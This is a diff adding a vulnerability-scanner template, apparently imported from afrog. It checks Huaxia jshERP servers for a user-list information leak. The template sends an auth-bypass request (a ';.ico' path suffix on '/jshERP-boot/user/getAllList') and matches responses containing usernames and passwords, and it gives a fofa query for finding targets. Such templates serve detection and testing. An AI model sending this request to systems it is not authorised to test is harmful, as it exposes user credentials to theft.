@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":'
+          - '"data":'
+          - '"userList":'
+          - '"username":'
+          - '"password":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/jshERP-boot/user/getAllList;.ico'
+id: huaxia-jsherp-info-leak
+info:
+  author: lei_sec
+  description: 'fofa: body="jshERP"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 华夏 ERP 信息泄露
+  severity: high
+  tags: huaxia,jsherp,info-leak,argus-import
